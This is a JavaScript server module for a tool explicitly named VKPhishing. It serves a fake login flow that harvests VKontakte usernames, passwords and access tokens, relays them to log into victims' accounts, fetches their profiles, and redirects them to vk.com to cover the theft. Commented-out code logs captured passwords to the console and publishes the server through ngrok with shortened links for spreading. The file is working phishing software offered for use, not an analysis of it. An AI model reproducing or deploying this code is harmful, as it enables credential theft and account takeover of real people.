const { EventEmitter } = require('events')

const Koa = require('koa')
const Router = require('@koa/router')
const bodyParser = require('koa-bodyparser')

const { VK } = require('vk-io')
const authConstants = require('./auth-constants')
const userbot = require('./userbot')

const renderers = require('./renderers')

class VKPhishing extends EventEmitter {
  constructor() {
    super()

    this.wayOut = 'https://vk.com'
  }

  async auth(ctx) {
    this.emit('before:auth-attempt', { ...ctx.request.body, ctx })

    let agent = 'android'

    const ua = String(ctx.headers['user-agent']).toLocaleLowerCase() || ''

    if (ua.includes('iphone')) agent = 'iphone'
    else if (ua.includes('ipad')) agent = 'ipad'
    else if (ua.includes('android')) agent = 'android'
    else if (ua.includes('windows phone')) agent = 'windowsPhone'
    else if (ua.includes('windows')) agent = 'windows'
    else agent = 'android'

    const json = await userbot(ctx.request.body, agent)
    this.emit('auth-attempt', {
      attempt: ctx.request.body,
      response: json,
      ctx
    })

    ctx.body = json
    this.emit('after:auth-attempt', {
      attempt: ctx.request.body,
      response: json
    })
  }

  async done(ctx) {
    this.emit('before:successful-auth', { ...ctx.request.body, ctx })

    const vk = new VK({
      token: ctx.request.body.token,
      apiVersion: '5.103',
      apiHeaders: {
        'User-Agent': ctx.headers['user-agent'] || 'vkApi/1.0'
      }
    })

    const [currentUser] = await vk.api.users.get()

    this.emit('successful-auth', { ...currentUser, ...ctx.request.body, ctx })

    ctx.body = 'ok'
    this.emit('after:successful-auth', { ...currentUser, ...ctx.request.body })
  }

  async exit(ctx) {
    this.emit('before:user-leave', { wayOut: this.wayOut, ctx })
    await ctx.redirect(this.wayOut)
    this.emit('after:user-leave', this.wayOut)
  }
}

async function create(extensions = []) {
  let instance = new VKPhishing()
  const extMeta = extensions.map((e) =>
    e.__meta__ && e.__meta__.name ? e.__meta__.name : null
  )

  for (const ext of extensions) {
    instance = await ext(instance, extMeta)
  }

  return instance
}

async function bootstrap(instance = create(), getRenderer = renderers.static) {
  const { port, host, renderer } = await getRenderer()

  instance.emit('before:start', { port, host, renderer })

  const app = new Koa()
  const router = new Router()

  app.use(bodyParser())

  app.use(router.routes())
  app.use(router.allowedMethods())
  app.use(renderer)

  router.post('/auth', (context) => instance.auth(context))
  router.post('/done', (context) => instance.done(context))

  router.get('/exit', (context) => instance.exit(context))

  app.listen(port, host, () => instance.emit('start', { port, host }))

  instance.emit('after:start', { port, host })
}

module.exports = {
  create,
  bootstrap,
  renderers,
  authConstants,
  extensions: require('./extensions')
}

// if (args.websocket)
//   io.sockets.emit('user_successful_auth', {
//     ...currentUser,
//     ...ctx.request.body
//   })

// if (json.status === R_SUCCESS) {
//   consola.log(outputSuccess + 'Success!')
// } else if (json.status === R_REQUIRE_2FA) {
//   consola.log(outputFail + 'Required 2FA!')
// } else {
//   consola.log(outputFail + 'Failed!')
// }

// consola.log()

// if (args.websocket) io.sockets.emit('user_auth_attempt', json)

// const io = require('socket.io')()

// const chalk = require('chalk')

// const ngrok = require('./ngrok')

// // Import and Set Nuxt.js options

// const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')

// async function start(args) {
//   app.use(bodyParser())

//   const renderers = require('./renderers/index')

//   if (args.listRenderers) {
//     consola.info('Renderers: ')

//     return 0
//   }

//   if (!(args.renderer in renderers)) {
//     throw new Error(`Renderer ${args.renderer} is not exists`)
//   }

//   const { port, host, renderer } = await renderers[args.renderer]()

//   router.post('/done', async (ctx) => {

//   })

//   router.post('/auth', async (ctx) => {
//     consola.log()

//     consola.info({
//       label: true,
//       message: 'Trying authenticate with credentials'
//     })

//     const input = chalk.bold.blueBright('>')
//     const outputSuccess = chalk.bold.green('< ')
//     const outputFail = chalk.bold.red('< ')

//     consola.log(`${input} Login: ${ctx.request.body.username}`)
//     consola.log(`${input} Password: ${ctx.request.body.password}`)

//     const json = await userbot(ctx.request.body)

//     if (json.status === R_SUCCESS) {
//       consola.log(outputSuccess + 'Success!')
//     } else if (json.status === R_REQUIRE_2FA) {
//       consola.log(outputFail + 'Required 2FA!')
//     } else {
//       consola.log(outputFail + 'Failed!')
//     }

//     consola.log()

//     if (args.websocket) io.sockets.emit('user_auth_attempt', json)

//     ctx.body = json
//   })

//   router.get('/exit', async (ctx) => ctx.redirect(await afterLogin()))

//   consola.ready({
//     message: `Server listening on http://${host}:${port}`,
//     badge: true
//   })

//   if (args.ngrok) {
//     try {
//       const publicUrl = await ngrok(port)
//       consola.info(`Listening public url: ${publicUrl}`)
//       const shortUrl = await getShortUrl(publicUrl)
//       consola.info(`Shorten url is: ${shortUrl}`)

//       if (args.websocket) {
//         io.sockets.emit('ngrok_connected', { publicUrl, shortUrl })
//       }
//     } catch (e) {
//       if (args.websocket) {
//         io.sockets.emit('ngrok_fail_start', e)
//       }

//       consola.error(e)
//     }
//   }

//   app.use(router.routes())
//   app.use(router.allowedMethods())
//   app.use(renderer)

//   app.listen(port, host)

//   if (args.websocket) {
//     const wsPort = port + 100

//     io.listen(wsPort)

//     consola.ready({
//       message: `Socket.IO server listening on ws://localhost:${wsPort}`,
//       badge: true
//     })
//   }
// }

// start(
//   yargs
//     .scriptName('vk-phishing')
//     .alias('l', 'list-renderers')
//     .alias('r', 'renderer')
//     .alias('ws', 'websocket')
//     .alias('ng', 'ngrok')
//     .default('r', 'static').argv
// )

// process
//   .on('unhandledRejection', (reason, p) => {
//     consola.error(reason, 'Unhandled Rejection at Promise', p)
//   })
//   .on('uncaughtException', (err) => {
//     consola.error(err, 'Uncaught Exception thrown')
//     process.exit(1)
//   })

// Object.defineProperty(module, 'exports', {
//   get() {
//     throw new Error('You can not require this package')
//   },

//   writable: false,
//   configurable: false,
//   enumerable: false,
//   value: null,
//   set() {
//     throw new Error('You can not require this package')
//   }
// })
